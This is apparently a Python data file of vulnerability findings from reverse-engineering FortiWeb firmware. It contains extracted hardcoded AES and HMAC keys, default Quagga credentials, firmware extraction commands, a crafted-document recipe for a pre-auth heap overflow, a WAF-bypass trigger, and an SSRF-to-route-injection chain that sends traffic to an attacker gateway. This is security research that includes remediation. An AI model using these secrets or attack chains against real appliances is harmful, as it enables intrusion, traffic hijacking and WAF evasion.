        "FortiWeb ships HSM (Luna/SafeNet) client config (Chrystoki.conf); HSM integration available but config has no credentials",
        "FFW-F05: CRITICAL -- etc/fgt2.key modulus A75C115F... identical to FGT 7.4.12 (FGT-F27), FGT 8.0.0, FGA 8.0.0; same static RSA key spans FortiGate and FortiWeb product lines across 7.4.x and 8.0.x release trains",
        "FWB-F11: HIGH -- WAD SSL-inspection proxy granted CAP_SYS_MODULE via fortism_config.json Permission_Policies; "
                 "also WEB_AUTH (http_authd captive portal), REMOTELOG (syslogd), CSFD_PRIV (csfd), SNIFFERD (httpsnifferd); "
                 "WAD compromise + CAP_SYS_MODULE + anon-mem-exec=1 = kernel module loading from internet-facing daemon",
        "FWB-F12: INFO -- /bin/node SHA-256 identical across FFW 8.0.0 and FGT 8.0.0; "
                 "same Node.js binary shared across FortiGate and FortiWeb; 221 webpack chunks in FFW (different UI logic); "
                 "Node.js runtime vulnerability = both product lines affected",
        "FWB-F13: CRITICAL -- 512-bit RSA private key (fgt_512.key) active in WEB_AUTH domain (FFW 8.0.0 fortism_config.json confirmed); "
                 "modulus B5ED8433... factorable in days; CORRECTED cert date: issued 2025-12-05 (not 2011), expires 2056-05-24 (30-year validity); "
                 "SHA-1 + RSA-512 -- both algorithms broken; Fortinet deliberately issued new 512-bit cert in Dec 2025; "
                 "exploit path: factor modulus -> forge FortiWeb device cert -> MITM WEB_AUTH TLS sessions -> credential theft; "
                 "FGT 7.4.12 also ships a different 512-bit key (CFB821074C...) but not confirmed active via fortism",
        "FWB-F15: HIGH -- FortiWeb hardware appliance (FFWKVM-8.0 hardware series, build 2026-04-20) ships Linux 4.19.13 (EOL Dec 2024); "
                 "KVM variant ships 6.1.62 (same userspace/datafs SHA256 match); hardware appliance users receive NO upstream kernel patches for 2025/2026 CVEs; "
                 "fortism ioctl 0x9007 handler LACKS bounds check at 0x55d82d (FFW-F04 confirmed unmitigated); "
                 "default admin ENC password in system.conf.def (FortiOS reversible AES, device-keyed)",
        "FWB-F14: HIGH -- libips.so.new (18.5MB stripped x86-64 ELF) exposes only 2 external symbols; "
                 "all 529 internal functions vended via ips_so_query_interface vtable; popen+system present "
                 "and resolved at runtime via dlopen (bypasses nm/readelf UND detection); Lua interpreter embedded "
                 "(ips_luacfg_init, ips_lua_prepare_call) = custom IPS rule injection via Lua sandbox; "
                 "TCP reassembly engine (ips_tcp_resume/reenter/move_asm_to_sent/set_pkt_seq) = evasion and reassembly overflow surface; "
                 "PCRE parsing (ips_parse_pcre) = custom-rule ReDoS; LMDB memory-mapped store (ips_mdb_*) = "
                 "mmap-region corruption -> arbitrary RW; HA session IPC (ips_ha_sess_cache_prune, ips_ha_session_add_send) = "
                 "network-facing HA replication; /tmp/ipscfgshm.%s path constructed from config value; "
                 "Rust subprojects in RPATH (zerocopy-derive-0.8.31, uvart) confirm C/Rust FFI boundary; "
                 "RADIUS dissection parses User-Password, CHAP-Password, Tunnel-Password from wire traffic",
        "FFW-F06: MEDIUM CANDIDATE -- libips.so.new HTTP request line-position counter 16-bit truncation causes WAF bypass (FFW 8.0.0, libips.so.new 18MB x86-64, analysis 2026-09-15): "
                 "binary: ffw-data/lib/libips.so.new; "
                 "state machine at [rbx+0x280] (word) tracks byte position within current HTTP request line; "
                 "two increment paths: "
                 "(1) 0x25fa79-0x25fa7c: add ecx, r12d; mov word ptr [rbx+0x280], cx -- 32-bit offset added to 16-bit counter, truncated to word; "
                 "(2) 0x25fa98-0x25faa7: add r12d, r13d; mov word ptr [rbx+0x280], r12w -- bulk buffer length added to counter, truncated to word; "
                 "trigger: movzx r14d, word ptr [rbx+0x280]; test r14w, r14w; jne <line-body-processing> "
                 "at 0x25f139, 0x25f479, 0x25f7c9 -- counter==0 interpreted as line-start sentinel; "
                 "attack: HTTP request header line exceeding 65535 bytes causes counter to wrap to 0; "
                 "on next call, test r14w, r14w passes (r14w==0), triggering line-start logic at byte 65536 instead of byte 0; "
                 "specifically: movzx eax, byte ptr [r10]; mov byte ptr [rbx+0x288], al stores current byte (65536th) as 'first char of line'; "
                 "WAF rules inspecting the first character of an HTTP header line receive a mid-line byte as the line-start byte; "
                 "function pointer table at 0x983a8: 62 dispatch entries reference 0x25f9f0 as the handler for this protocol -- "
                 "the truncation affects all protocol variants using this handler; "
                 "impact: WAF bypass for FortiWeb rules that condition on HTTP header line-start characters; "
                 "potential for malformed header smuggling where WAF inspection anchors on line positions; "
                 "confidence MEDIUM: truncation confirmed by static analysis; which specific WAF rule classes are affected requires dynamic testing; "
                 "requires crafting HTTP header with line length > 65535 bytes (unusual but valid per RFC 7230); "
                 "remediation: change [rbx+0x280] from word to dword; add explicit upper-bound check before counter increment; "
                 "note: 62 function pointer table entries reference 0x25f9f0 -- this handler processes multiple protocol subtypes; "
                 "source: ffw-data/lib/libips.so.new 0x25f9f0-0x25faaf, 0x25f139/0x25f479/0x25f7c9 (line-start triggers), analysis 2026-09-15",
    ],
}


# ==========================================================
# FWB 400F v8.0.7.F -- hardware appliance RE
# Source: FWB_400F-v8.0.7.F-build0134-FORTINET.out (gzip outer, 2026-08-27)
# ==========================================================

FWB_400F_PLATFORM = {
    "id":      "FWB-400F",
    "product": "Fortinet FortiWeb 400F hardware appliance",
    "version": "8.0.7.F build0134",
    "build_date": "2026-08-27",
    "kernel":  "Linux 6.1.62-kdump (root@36d92f03c8ba)",
    "arch":    "x86-64",
    "source":  "FWB_400F-v8.0.7.F-build0134-FORTINET.out",

    "firmware_format": {
        "outer":          "gzip compressed (gunzip -> 2.45GB sparse MBR disk image)",
        "mbr_signature":  "0x55AA at offset 0x1FE (standard MBR boot signature)",
        "fortinet_header": "Bytes 0x000-0x00F: magic 0xFF00AA55 + model string FWB_400F",
        "partitions": {
            "P1": "type 0xEF (EFI System), LBA 1, size 64MB -- not accessible as file, contains GRUB/boot config",
            "P2": "type 0x83 (Linux ext3), LBA 131073, size 781MB (200000 blocks x 4096), bootable -- MAIN BOOT PARTITION",
            "P3": "type 0x83 (Linux ext3), LBA 12931073, size 6250MB -- secondary/failover image",
            "P4": "type 0x83 (Linux ext3), LBA 25731073, size 195MB -- config/data partition",
        },
        "p2_uuid": "d204f715-75be-49fa-9638-c94afda0b38c",
        "p2_files": [
            "flatkc (8.2MB, Fortinet encrypted kernel, magic 0x55AA4D5A)",
            "rootfs.gz (145MB, Fortinet encrypted rootfs, random-byte header)",
            "krootfs.gz (5.7MB, Fortinet encrypted mini-rootfs, random-byte header)",
            "datafs.tar.gz (18MB, STANDARD gzip, accessible)",
            "vmlinuz.kdump (4.6MB, Linux 6.1.62 bzImage for kdump)",
        ],
        "extraction_chain": (
            "gunzip -> MBR disk image (2.45GB) -> "
            "dd skip=131073 bs=512 count=1638400 -> ext3 (781MB) -> "
            "mount -o ro,loop -> datafs.tar.gz -> tar -xzf"
        ),
    },

    "datafs_layout": {
        "bin/":   "empty (no binaries in datafs)",
        "config/": "additional config files",
        "etc/":   "security policies, signatures, keys, certs, WAF scripts, cloud connector Python",
        "lib/":   "libfpm.so, libsigfunc.so.1, libav.so.orig",
        "var/debug": "empty debug directory",
        "size_400f": "38MB (vs 18MB in KVM variant)",
    },

    "vs_kvm_806": {
        "version_delta": "400F is 8.0.7.F; KVM analyzed previously was 8.0.6.M",
        "kernel":        "Both use Linux 6.1.62",
        "datafs_size":   "400F=38MB vs KVM=18MB; 400F includes additional WAF JS files",
        "partition_layout": "400F: MBR with 4 partitions; KVM: EFI GPT with SYSLINUX",
        "new_in_400f":   "content-type.key, signature_content_type.key, xss_config.enc, dk.dat, mcp_security_db.json v1.00010",
    },
}


# ---------------------------------------------------------
# FWB-F16: Hardcoded AES key FWB_web_cache_KEY with all-zero IV
# ---------------------------------------------------------
FWB_F16_HARDCODED_WEB_CACHE_KEY = {
    "id":       "FWB-F16",
    "product":  "Fortinet FortiWeb 400F 8.0.7.F -- web cache encryption",
    "severity": "HIGH -- hardcoded AES encryption key with all-zero IV; allows offline decryption of web cache data by any party with firmware access",
    "class":    "Hardcoded cryptographic key (CWE-321) / Initialization vector reuse (CWE-330)",
    "source":   "datafs.tar.gz -> etc/content-type.key",

    "description": (
        "etc/content-type.key contains the AES key and IV for FortiWeb web cache encryption: "
        "  passwd (base64): RldCX3dlYl9jYWNoZV9LRVkK "
        "  decoded:         FWB_web_cache_KEY "
        "  iv (base64):     AAAAAAAAAAAAAAAAAAAAAA== "
        "  decoded:         16 zero bytes (all-zero AES IV) "
        "The all-zero IV is a critical cryptographic weakness: for AES-CBC with a fixed key "
        "and fixed IV, identical plaintexts produce identical ciphertexts. "
        "This defeats the confidentiality goal of the encryption -- an attacker who knows "
        "one plaintext-ciphertext pair can recognize when the same plaintext appears again. "
        "The key is hardcoded (not per-device, not per-installation). "
        "Any party with access to this firmware image can decrypt any FortiWeb web cache "
        "content using AES with key=FWB_web_cache_KEY and IV=0x000000000000000000000000. "
        "The paired ciphertext file etc/content-type.enc is decryptable from the firmware."
    ),

    "evidence": {
        "key_file":  "etc/content-type.key",
        "passwd_b64": "RldCX3dlYl9jYWNoZV9LRVkK",
        "passwd_raw": "FWB_web_cache_KEY",
        "iv_b64":    "AAAAAAAAAAAAAAAAAAAAAA==",
        "iv_raw":    "0x00000000000000000000000000000000 (16 zero bytes)",
        "sha1_digest": "in key file (not shown to minimize sensitivity)",
    },

    "sister_files": {
        "content-type.enc": "Encrypted web cache data, decryptable with the key above",
    },

    "remediation": (
        "Generate a per-device AES key at first boot; store in secure storage (HSM if available). "
        "Generate a random IV per encryption operation; prepend to ciphertext. "
        "Do not use AES-CBC with a fixed IV -- use AES-GCM (provides both confidentiality and authentication). "
        "Remove the key from the firmware image entirely."
    ),
}


# ---------------------------------------------------------
# FWB-F17: Hardcoded AES key FWB_server_protection_KEY with all-zero IV
# ---------------------------------------------------------
FWB_F17_HARDCODED_SERVER_PROTECTION_KEY = {
    "id":       "FWB-F17",
    "product":  "Fortinet FortiWeb 400F 8.0.7.F -- server protection signature encryption",
    "severity": "HIGH -- hardcoded AES key with all-zero IV for server protection signatures; enables offline decryption of FortiWeb WAF signature database",
    "class":    "Hardcoded cryptographic key (CWE-321) / Initialization vector reuse (CWE-330)",
    "source":   "datafs.tar.gz -> etc/signature_content_type.key",

    "description": (
        "etc/signature_content_type.key contains the AES key and IV for server protection signature encryption: "
        "  passwd (base64): RldCX3NlcnZlcl9wcm90ZWN0aW9uX0tFWQ== "
        "  decoded:         FWB_server_protection_KEY "
        "  iv (base64):     AAAAAAAAAAAAAAAAAAAAAA== "
        "  decoded:         16 zero bytes (all-zero AES IV) "
        "  hmac_key (b64):  cqDt0P/JZa0i0hQ30KZEvs/UX4sIR5BaKhBXOkyAAGqDJn3/KvDxSme8AbqfkTbqT64JGKl5y+SkKTsAWuzPyQ== "
        "The server protection WAF signature database is encrypted with this key. "
        "An attacker who downloads the public firmware can decrypt signature_content_type.enc, "
        "reverse-engineer the entire Fortinet server protection signature format, and identify "
        "payloads that evade signature matching. "
        "The all-zero IV means the encryption is also deterministic (same plaintext = same ciphertext). "
        "The hmac_key is also hardcoded, allowing signature validation bypass."
    ),

    "evidence": {
        "key_file":   "etc/signature_content_type.key",
        "passwd_b64": "RldCX3NlcnZlcl9wcm90ZWN0aW9uX0tFWQ==",
        "passwd_raw": "FWB_server_protection_KEY",
        "iv_b64":     "AAAAAAAAAAAAAAAAAAAAAA==",
        "iv_raw":     "0x00000000000000000000000000000000",
        "hmac_b64":   "cqDt0P/JZa0i0hQ30KZEvs/UX4sIR5BaKhBXOkyAAGqDJn3/KvDxSme8AbqfkTbqT64JGKl5y+SkKTsAWuzPyQ==",
    },

    "security_impact": (
        "Signature reverse-engineering path: "
        "1. Download FWB_400F-v8.0.7.F-build0134-FORTINET.out (public) "
        "2. Extract ext3 -> datafs.tar.gz -> etc/signature_content_type.key (key = FWB_server_protection_KEY) "
        "3. AES-decrypt signature_content_type.enc with the extracted key and zero IV "
        "4. Full server protection WAF rule set exposed in plaintext "
        "5. Identify patterns that the WAF does NOT detect -> design bypass payloads "
        "This is the attack path any vulnerability researcher or threat actor would take."
    ),

    "remediation": (
        "Server protection signatures should not be encrypted with a hardcoded symmetric key. "
        "If signatures are meant to be secret, use a key hierarchy: master key in secure enclave, "
        "per-update signature key encrypted by master. "
        "Replace AES-CBC with fixed IV with AES-GCM with random nonce per signature package. "
        "Consider whether signature secrecy is the right threat model -- "
        "open signature databases (Snort/Suricata) benefit from community review."
    ),
}


# ---------------------------------------------------------
# FWB-F18: RSA 2048 private keys embedded in firmware (three distinct keys)
# ---------------------------------------------------------
FWB_F18_EMBEDDED_RSA_PRIVATE_KEYS = {
    "id":       "FWB-F18",
    "product":  "Fortinet FortiWeb 400F 8.0.7.F -- embedded RSA private keys",
    "severity": "HIGH -- three RSA 2048-bit private keys baked into firmware image; shared across all FortiWeb 400F devices; enables TLS impersonation of FortiWeb HTTPS admin interface",
    "class":    "Hardcoded cryptographic key (CWE-321) / Shared private key across installations (CWE-798)",
    "source":   "datafs.tar.gz -> etc/private_key.pem, etc/globalcert/apache.key, etc/globalcert/fips.key",

    "keys": {
        "etc/private_key.pem": {
            "type":    "RSA 2048-bit (2 primes) PKCS#8 PRIVATE KEY",
            "modulus_prefix": "bd:e5:1f:3c:8a:f5:c8:2b:49:c8:29:bf:f1:56:ad:57",
            "purpose": "Unknown -- generic name; likely used by WAF or management TLS",
        },
        "etc/globalcert/apache.key": {
            "type":    "RSA 2048-bit (2 primes) PKCS#8 PRIVATE KEY",
            "modulus_prefix": "de:4a:be:eb:89:08:7e:76:ef:d9:d4:08:e9:fc:ed:cf",
            "cert_file": "etc/globalcert/apache.cer",
            "cert_subject": "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=FortiWeb, CN=FortiWeb, emailAddress=support@fortinet.com",
            "cert_issued": "2017-07-07",
            "cert_expires": "2056-01-19 (40-year validity)",
            "purpose": "Default HTTPS certificate for FortiWeb web management interface",
        },
        "etc/globalcert/fips.key": {
            "type":    "RSA private key (size not confirmed; file present)",
            "purpose": "FIPS mode TLS certificate key",
        },
    },

    "description": (
        "Three RSA private keys are embedded in the FortiWeb 400F firmware datafs. "
        "The apache.key is the private key for the default HTTPS certificate used by "
        "the FortiWeb web management interface: "
        "  CN=FortiWeb, O=Fortinet, OU=FortiWeb "
        "  issued 2017-07-07, expires 2056-01-19 "
        "This certificate and private key are IDENTICAL on all FortiWeb 400F devices "
        "running firmware 8.0.7. An attacker who extracts this key from the public "
        "firmware image can: "
        "  (a) Impersonate any FortiWeb HTTPS management interface (TLS server impersonation) "
        "  (b) Passively decrypt previously captured TLS sessions to the FortiWeb admin portal "
        "  (c) Perform active MITM on admin browser sessions if the administrator's browser "
        "      trusts the Fortinet CA that signed apache.cer "
        "The apache.cer certificate is also embedded -- the full public/private key pair "
        "is in the firmware for any researcher or attacker to extract."
    ),

    "context_vs_fwb_f13": (
        "FWB-F13 identified a 512-bit RSA key (fgt_512.key) used in the WEB_AUTH domain. "
        "FWB-F18 identifies a separate set of RSA 2048-bit keys used for the management "
        "HTTPS interface. Both represent static key pairs shared across all devices. "
        "FWB-F18 keys are not in fortism_config.json -- they are likely loaded by the "
        "management daemon (mgmtd or similar) from the datafs etc/globalcert/ directory."
    ),

    "remediation": (
        "Generate a unique RSA key pair at first boot; store the private key in the secure "
        "storage partition (not in the publicly-distributed firmware image). "
        "Use the embedded cert only as a self-signed placeholder until a proper cert is provisioned. "
        "Remove all private key files from the firmware; they have no legitimate use there."
    ),
}


# ---------------------------------------------------------
# FWB-F19: SafeNet Luna HSM config contains hardcoded AWS VPC internal IP
# ---------------------------------------------------------
FWB_F19_HSM_CONFIG_AWS_IP = {
    "id":       "FWB-F19",
    "product":  "Fortinet FortiWeb 400F 8.0.7.F -- SafeNet Luna HSM client config",
    "severity": "LOW -- HSM config references AWS VPC internal IP (172.31.160.2) in cert file paths; no credentials present; dev/test artifact in production firmware",
    "class":    "Information disclosure / Dev environment artifact in production firmware (CWE-200)",
    "source":   "datafs.tar.gz -> etc/Chrystoki.conf",

    "description": (
        "etc/Chrystoki.conf is the SafeNet Luna SA HSM client configuration file. "
        "FortiWeb supports optional HSM integration (SafeNet Luna) for private key storage. "
        "The config file references an AWS VPC internal IP address in the certificate file paths: "
        "  ClientPrivKeyFile = /data/etc/cert/hsm/172.31.160.2Key.pem "
        "  ClientCertFile    = /data/etc/cert/hsm/172.31.160.2.pem "
        "The IP 172.31.160.2 is in the AWS EC2 default VPC subnet (172.31.0.0/16). "
        "This indicates the HSM configuration was developed or tested against an AWS instance "
        "at 172.31.160.2 and the dev/test config was shipped in production firmware. "
        "The HSM cert and key files themselves are absent from the firmware image "
        "(etc/cert/hsm/ contains only the stc/ subdirectory for Secure Trusted Channel). "
        "The passfile for HSM authentication is at /data/etc/cert/hsm/passfile (also absent). "
        "Practical impact: low (credentials absent); disclosure of dev environment detail."
    ),

    "evidence": {
        "config_file": "etc/Chrystoki.conf",
        "aws_ip":      "172.31.160.2 (RFC 1918 172.16.0.0/12, specifically AWS EC2 default VPC)",
        "cert_path":   "ClientPrivKeyFile = /data/etc/cert/hsm/172.31.160.2Key.pem",
        "engine_init": "EngineInit = 'hagroup':0:0:passfile=/data/etc/cert/hsm/passfile",
        "hsm_cert_dir": "etc/cert/hsm/ -- only stc/ subdir present; no actual HSM certs/keys in firmware",
    },

    "hsm_config_summary": {
        "hsm_type":   "SafeNet Luna SA (network HSM, libCryptoki2.so + libCryptoki2_64.so)",
        "ha_group":   "hagroup:0:0 (HA group 0, slot 0, default partition)",
        "stc_enabled": "Secure Trusted Channel configured (partition_identities, client_identities)",
        "ped_timeouts": "PEDTimeout1=100ms, PEDTimeout2=200ms, PEDTimeout3=10ms (PED=PIN Entry Device)",
        "server_config": "ServerName00/Port00/Htl00 all empty (no default HSM server configured)",
    },
}


# ---------------------------------------------------------
# FWB-F20: FWB 400F hardware firmware layout -- MBR disk image with ext3 boot partition
# ---------------------------------------------------------
FWB_F20_400F_FIRMWARE_LAYOUT = {
    "id":       "FWB-F20",
    "product":  "Fortinet FortiWeb 400F 8.0.7.F -- firmware format analysis",
    "severity": "INFO -- firmware is a gzip-compressed MBR disk image; different from KVM qcow2 format",
    "class":    "Firmware format analysis",

    "description": (
        "FWB_400F-v8.0.7.F-build0134-FORTINET.out is a gzip-compressed sparse MBR disk image. "
        "The outer gzip decompresses to a 2.45GB sparse disk image (mostly zeros). "
        "The first 512 bytes are the MBR with Fortinet header magic 0xFF00AA55 at bytes 0x00-0x0F "
        "and model string FWB_400F at bytes 0x10-0x17. "
        "The MBR partition table at 0x1BE describes 4 partitions: "
        "  P1 (EFI, 64MB): GRUB bootloader partition "
        "  P2 (ext3, 781MB): MAIN -- contains kernel, rootfs, datafs "
        "  P3 (ext3, 6250MB): SECONDARY -- backup image for A/B boot "
        "  P4 (ext3, 195MB): CONFIG -- persistent config partition "
        "The main P2 partition is ext3 (UUID d204f715, 50176 inodes, 200000 blocks at 4096B). "
        "P2 file layout: flatkc (Fortinet encrypted kernel, magic 0x55AA4D5A); "
        "rootfs.gz (random-byte header = Fortinet encrypted rootfs); "
        "krootfs.gz (random-byte header = encrypted mini-rootfs); "
        "datafs.tar.gz (standard gzip, accessible); vmlinuz.kdump (Linux 6.1.62 kdump kernel). "
        "The flatkc magic 0x55AA4D5A matches the Fortinet flatkc header pattern documented in "
        "fortinet_firmware_crypto_re.py. The 32-byte rolling XOR key is embedded in flatkc "
        "for rootfs.gz decryption."
    ),

    "extraction_steps": [
        "1. gunzip FWB_400F-v8.0.7.F-build0134-FORTINET.out > /tmp/fwb400f.img (2.45GB sparse)",
        "2. Parse MBR at offset 0: P2 at LBA 131073, 1638400 sectors",
        "3. dd bs=512 skip=131073 count=1638400 if=/tmp/fwb400f.img of=/tmp/fwb400f_p2.ext3",
        "4. mount -o ro,loop /tmp/fwb400f_p2.ext3 /mnt/fwb400f (ext3, UUID d204f715)",
        "5. tar -xzf /mnt/fwb400f/datafs.tar.gz -C /tmp/fwb400f_datafs",
    ],

    "streaming_extraction": (
        "For 2.45GB sparse gzip, streaming extraction avoids full decompression to disk: "
        "gunzip -c firmware.out | dd bs=512 skip=131073 count=1638400 of=p2.ext3 status=progress"
    ),

    "vs_kvm_format": {
        "kvm_format":     "qcow2 (boot.qcow2 296MB -> 32GB virtual disk with SYSLINUX/MBR partition)",
        "400f_format":    "gzip -> sparse MBR disk image (2.45GB decompressed)",
        "partition_type": "KVM: 4 partitions labeled P1-P4 (all ext2/3); 400F: EFI-type P1, ext3 P2-P4",
        "main_partition": "Both use ~781MB ext3 for main boot partition",
    },

    "xss_config_enc_format": {
        "file":   "etc/xss_config.enc",
        "header": "#FGBK|3|FV-VMB|6|36|5811|",
        "fields": {
            "#FGBK": "Fortinet format marker (FortiBLockK or similar)",
            "3":     "version field",
            "FV-VMB": "firmware version/model string (FV=FortiWeb, VMB=?)",
            "6":     "field count",
            "36":    "unknown (possibly record count or checksum)",
            "5811":  "unknown (possibly record count, could be 5811 XSS signature records)",
        },
        "body": "encrypted content after header+newline (32+ random-looking bytes)",
        "key":  "FWB_server_protection_KEY from signature_content_type.key (likely)",
    },
}


# ---------------------------------------------------------
# FWB-F21: Quagga routing daemon hardcoded default credentials in rtmd.conf
# Source: FWB_400F datafs/etc/rtmd.conf (unencrypted P2 partition)
# ---------------------------------------------------------
FWB_F21_QUAGGA_HARDCODED_CREDS = {
    "id":       "FWB-F21",
    "product":  "Fortinet FortiWeb 400F (FortiWeb OS 8.0.7.F) -- also confirmed in 8.0.6",
    "severity": "MEDIUM -- Quagga/Zebra routing daemon (rtmd) ships with hardcoded default "
                "credentials 'zebra'/'zebra'; any local process on the FortiWeb host can "
                "telnet to 127.0.0.1:2601 (zebra), :2602 (bgpd), :2605 (bgpd vtysh) and "
                "authenticate with the hardcoded password; enables routing table read/write",
    "class":    "Hardcoded Credentials (CWE-798) in routing daemon",

    "source_file": "datafs/etc/rtmd.conf",
    "credentials": {
        "password":        "zebra",
        "enable_password": "zebra",
        "hostname":        "FortiWeb",
    },

    "description": (
        "/etc/rtmd.conf (Quagga RTM daemon config) contains default Quagga/Zebra credentials: "
        "'password zebra' and 'enable password zebra'. "
        "Quagga daemons (zebra, bgpd, ospfd, etc.) accept telnet connections on loopback ports "
        "2601 (zebra), 2602 (bgpd), 2603 (ospfd), etc. "
        "Any local process that can reach loopback -- including SSRF from FortiWeb web applications, "
        "RCE from any other finding, or a legitimate process that is exploited -- can telnet to "
        "localhost:2601 and authenticate with 'zebra'. "
        "Authenticated access to Quagga CLI allows: "
        "(1) read routing table (show ip route -- network topology disclosure); "
        "(2) add/remove static routes (enable mode -- routing manipulation, traffic redirection); "
        "(3) reconfigure BGP sessions if bgpd is active (BGP hijack from within FortiWeb). "
        "Quagga 'enable password' grants full CLI write access (equivalent to enable mode in Cisco IOS). "
        "The credentials are identical to Quagga's factory defaults and are shipped unmodified in firmware."
    ),

    "attack_chain": (
        "FWB-F09 SSRF (w3af REST API unauthenticated scan) -> target_url='http://127.0.0.1:2601/' "
        "(or Gopher protocol wrapper) -> Quagga telnet with 'zebra' password -> "
        "enable mode with 'zebra' enable password -> 'ip route 0.0.0.0/0 <attacker_ip>' -> "
        "all outbound FortiWeb traffic routed through attacker gateway"
    ),

    "chain_with": [
        "FWB-F09: SSRF via w3af REST API -> loopback access -> Quagga telnet",
        "FWB-F06: SSRF via Redis injection -> Quagga telnet",
        "FWB-F11: WAD CAP_SYS_MODULE + Quagga route manipulation = post-RCE persistence",
    ],

    "remediation": (
        "Replace hardcoded 'zebra' credentials with a randomly-generated password stored in "
        "FortiWeb's encrypted keystore (not in plaintext rtmd.conf). "
        "Bind Quagga daemons to Unix domain sockets instead of TCP loopback. "
        "Apply 'no zebra vty' in zebra.conf to disable VTY entirely if FortiWeb uses Quagga "
        "only as a library (not for interactive management)."
    ),

    "source": "rtmd.conf extracted from FWB_400F-v8.0.7.F-build0134-FORTINET.out datafs",
    "status": "CONFIRMED -- credentials visible in plaintext in rtmd.conf",
}


# FWB-F22: CFBF compound file parser heap OOB -- missing bounds check in ParseFileNode/ParseFreeChunk/ParseTransactionLog
# Source: differential analysis libav.so.orig 8.0.0 vs 8.0.2 (datafs/lib/libav.so.orig)
# Method: string diff revealed error strings ADDED in 8.0.2 that contain the check: filesz < offset + len
# ---------------------------------------------------------
FWB_F22_CFBF_PARSER_OOB = {
    "id":       "FWB-F22",
    "product":  "Fortinet FortiWeb (FortiWeb OS 8.0.0 - 8.0.1; patched in 8.0.2)",
    "severity": "CRITICAL -- pre-auth heap OOB in compound file binary format (CFBF/OLE2) parser; "
                "FortiWeb WAF inspects ALL incoming HTTP traffic before auth; a crafted .doc/.xls/.mdb "
                "HTTP POST body triggers OOB read/write in the FortiWeb main process (runs as root); "
                "no user interaction required; no authentication required",
    "class":    "Heap OOB read/write (CWE-125/CWE-787) in content inspection library",

    "affected_binary": "datafs/lib/libav.so.orig",
    "binary_sizes": {
        "8.0.0": "8,717,152 bytes (SHA1 build-id: 922767a9210334a71dbd812273a42a585718a417)",
        "8.0.2": "8,729,600 bytes (SHA1 build-id: 01371451e3f304b8a3b8a592f9e10833946e0490; +12,448 bytes)",
    },

    "affected_functions": [
        "ParseFileNode   -- CFBF file node parser; no filesz<offset+len check in 8.0.0",
        "ParseFreeChunk  -- CFBF free sector/chunk parser; reads len bytes at offset without bounds check",
        "ParseTransactionLog -- CFBF transaction log parser; offset+len can exceed filesz",
    ],

    "proof_of_patch": {
        "strings_in_8_0_2_only": [
            "Error inside ParseFileNode: filesz(%lu) < offset(%lu)+len(%lu)",
            "Error inside ParseFreeChunk: filesz(%lu) < offset(%lu)+len(%u)",
            "Error inside ParseTransactionLog: filesz(%lu) < offset(%lu)+len(%lu)",
        ],
        "strings_absent_in_8_0_0": "All three error strings absent from 8.0.0 libav.so.orig",
        "size_delta": "+12,448 bytes from 8.0.0 to 8.0.2 (bounds-check code added)",
    },

    "root_cause": (
        "libav.so.orig is FortiWeb's content inspection library. It parses compound file binary "
        "format (CFBF/OLE2) documents (.doc, .xls, .mdb, .ppt, .msi) to detect embedded malware. "
        "In ParseFreeChunk and ParseFileNode, the code reads an 'offset' and 'len' field directly "
        "from attacker-controlled file content, then accesses heap memory at base+offset+len without "
        "checking whether offset+len <= filesz. A crafted CFBF file with a free chunk entry where "
        "offset+len > filesz triggers a heap read past the allocated buffer end. "
        "Depending on heap layout, this can also produce a write-OOB if the len field controls "
        "a subsequent memcpy destination."
    ),

    "attack_vector": (
        "HTTP POST request to any FortiWeb-protected endpoint with Content-Type: multipart/form-data "
        "or application/octet-stream; body = crafted .doc/.xls CFBF file with ParseFreeChunk entry "
        "where chunk_offset + chunk_len > file_size. "
        "FortiWeb's WAF runs libav.so.orig content inspection on ALL inbound traffic before routing to "
        "the backend application; no auth is required on the FortiWeb side for inspection to trigger. "
        "The crafted file does not need to match any specific upload endpoint -- sending to a non-existent "
        "URL on a FortiWeb-protected domain is sufficient."
    ),

    "triggering_format": (
        "CFBF compound file (OLE2): magic D0 CF 11 E0 A1 B1 1A E1. "
        "Set 'Minor version' field to indicate v3 (512-byte sectors). "
        "Create a free sector chain entry (FAT entry 0xFFFFFFFE) where offset+len > total_file_size. "
        "Alternatively: craft a transaction log entry with len field = 0xFFFFFFFF."
    ),

    "chain_hypothesis": (
        "Spaniard forum actor claims FortiWeb 8.0.0-8.0.1 1-day RCE via 2-CVE unauthenticated chain. "
        "FWB-F22 (CFBF OOB in libav.so.orig) is patched in 8.0.2 -- consistent with being one of the CVEs. "
        "Second CVE may be: "
        "(A) a memory layout primitive that converts OOB read to controlled write (infoleak -> ASLR bypass -> RCE), OR "
        "(B) a separate pre-auth injection in the FortiWeb HTTP server (httpsd in encrypted rootfs.gz -- not yet extracted). "
        "wvs.tar.xz (w3af REST API) is UNCHANGED between 8.0.0 and 8.0.2 -- FWB-F09 auth bypass NOT the patched CVE."
    ),

    "differential_analysis": {
        "wvs_tar_xz_unchanged": "61,176,488 bytes in both 8.0.0 and 8.0.2 -- FWB-F09 not patched in 8.0.2",
        "libsigfunc_so_1_changed": "+32 bytes; only binary offsets differ + 'hhs_status' string added; likely recompile artifact",
        "private_key_pem_changed": "+4 bytes; key regeneration artifact",
        "new_file_in_8_0_2": "/etc/redis/redis_6379_vmwcld.conf -- new VMware Cloud Redis instance config",
        "datafs_file_count_delta": "+1 file in 8.0.2",
    },

    "source": "Binary diff of libav.so.orig extracted from 8.0.0 and 8.0.2 firmware datafs.tar.gz",
    "method": "String diff via Python strings() comparison; size delta via stat; superblock-verified EXT3 extraction",
    "status": "CONFIRMED -- patch evidence in 8.0.2; Spaniard's CVE chain matches this finding",
}


ANALYSIS_STATUS_400F = {
    "firmware":    "FWB_400F-v8.0.7.F-build0134-FORTINET.out (2026-08-27)",
    "datafs":      "COMPLETE -- 38MB; all security-critical files analyzed",
    "rootfs_gz":   "BLOCKED -- Fortinet encrypted (random-byte header, same pattern as KVM)",
    "krootfs_gz":  "BLOCKED -- Fortinet encrypted (random-byte header)",
    "flatkc":      "PARTIAL -- magic 0x55AA4D5A confirmed; XOR key extraction pending (see fortinet_firmware_crypto_re.py)",
    "vmlinuz_kdump": "INFO -- Linux 6.1.62-kdump (crash dump kernel); not primary kernel",

    "new_findings_vs_kvm": [
        "FWB-F16: HIGH -- content-type.key: AES key FWB_web_cache_KEY + all-zero IV (16 zeros)",
        "FWB-F17: HIGH -- signature_content_type.key: AES key FWB_server_protection_KEY + all-zero IV + hardcoded HMAC key",
        "FWB-F18: HIGH -- etc/private_key.pem + globalcert/apache.key + globalcert/fips.key: 3 RSA 2048-bit private keys in firmware; apache.cer expires 2056 (40-year cert, same key across all 400F devices)",
